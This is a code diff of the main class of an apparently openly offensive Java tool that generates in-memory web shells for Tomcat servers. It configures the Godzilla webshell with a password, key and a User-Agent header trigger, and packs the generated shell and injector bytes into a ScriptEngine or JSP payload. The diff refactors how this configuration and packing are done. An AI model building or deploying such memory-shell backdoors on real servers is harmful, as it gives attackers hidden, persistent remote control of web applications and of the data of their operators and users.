@@ -1,13 +1,10 @@
 package com.reajason.javaweb;
 
 import com.reajason.javaweb.config.*;
-import com.reajason.javaweb.memsell.packer.JspPacker;
+import com.reajason.javaweb.memsell.packer.Packer;
 import com.reajason.javaweb.memsell.tomcat.TomcatShell;
-import net.bytebuddy.jar.asm.Opcodes;
 
 import java.io.IOException;
-import java.nio.file.Files;
-import java.nio.file.Paths;
 
 /**
  * @author ReaJason
@@ -15,34 +12,27 @@ import java.nio.file.Paths;
  */
 public class GeneratorMain {
     public static void main(String[] args) throws IOException {
-        Server server = Server.TOMCAT;
-        ShellTool shellTool = ShellTool.Godzilla;
-        String shellType = TomcatShell.JAKARTA_FILTER;
-        GodzillaShellConfig shellConfig = GodzillaShellConfig.builder()
-                .pass("passFilter")
-                .key("keyFilter")
+        ShellConfig shellConfig = ShellConfig.builder()
+                .server(Server.TOMCAT)
+                .shellTool(ShellTool.Godzilla)
+                .shellType(TomcatShell.LISTENER).build();
+        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
+                .pass("pass123")
+                .key("key123")
                 .headerName("User-Agent")
                 .headerValue("test")
                 .build();
-        GenerateResult generateResult = generate(server, shellTool, shellType, shellConfig, Opcodes.V11);
-        if (generateResult != null) {
-            String shellBytesBase64Str = generateResult.getShellBytesBase64Str();
-            String injectorBytesBase64Str = generateResult.getInjectorBytesBase64Str();
-            Files.write(Paths.get(shellConfig.getShellClassName() + ".class"), generateResult.getShellBytes());
-            System.out.println(shellConfig.getShellClassName() + " : " + shellBytesBase64Str);
-            System.out.println(shellConfig.getInjectorClassName() + " : " + injectorBytesBase64Str);
-            System.out.println(shellConfig);
-            Files.write(Paths.get(shellConfig.getInjectorClassName() + ".class"), generateResult.getInjectorBytes());
-            JspPacker jspPacker = new JspPacker();
-            String jspContent = new String(jspPacker.pack(generateResult));
-            System.out.println(jspContent);
+
+        byte[] bytes = generate(shellConfig, new InjectorConfig(), godzillaConfig, Packer.INSTANCE.ScriptEngine);
+        if (bytes != null) {
+            System.out.println(new String(bytes));
         }
     }
 
-    public static GenerateResult generate(Server server, ShellTool shellTool, String shellType, ShellConfig shellConfig, int targetJdkVersion) {
-        switch (server) {
+    public static GenerateResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
+        switch (shellConfig.getServer()) {
             case TOMCAT:
-                return TomcatShell.generate(shellTool, shellType, shellConfig, targetJdkVersion);
+                return TomcatShell.generate(shellConfig, injectorConfig, shellToolConfig);
             case BES:
                 break;
             case RESIN:
@@ -52,6 +42,14 @@ public class GeneratorMain {
             default:
                 throw new IllegalArgumentException("Unsupported server");
         }
-        return GenerateResult.builder().build();
+        return null;
+    }
+
+    public static byte[] generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig, Packer.INSTANCE packerInstance) {
+        GenerateResult generateResult = generate(shellConfig, injectorConfig, shellToolConfig);
+        if (generateResult != null) {
+            return packerInstance.getPacker().pack(generateResult);
+        }
+        return null;
     }
 }
